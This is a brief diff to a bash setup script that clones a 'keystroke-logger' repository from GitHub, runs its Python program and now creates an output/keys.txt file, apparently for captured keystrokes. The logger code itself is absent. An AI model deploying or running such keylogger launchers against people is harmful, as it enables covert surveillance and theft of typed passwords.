@@ -2,7 +2,7 @@
 
 # Configuration - EDIT THESE VALUES
 REPO_URL="https://github.com/exploittracer/keystroke-logger.git"
-PROGRAM_NAME="keylogger_printer.py"
+PROGRAM_NAME="keystroke_logger.py"
 
 # Extract directory name from repo URL
 DIR_NAME=$(basename "$REPO_URL" .git)
@@ -41,6 +41,11 @@ if [ -f "requirements.txt" ]; then
 else
     echo "[!] No requirements.txt found. Skipping dependency installation."
 fi
+
+mkdir output
+cd output
+touch keys.txt
+cd ..
 
 echo "[+] Running $PROGRAM_NAME..."
 python3 "$PROGRAM_NAME"
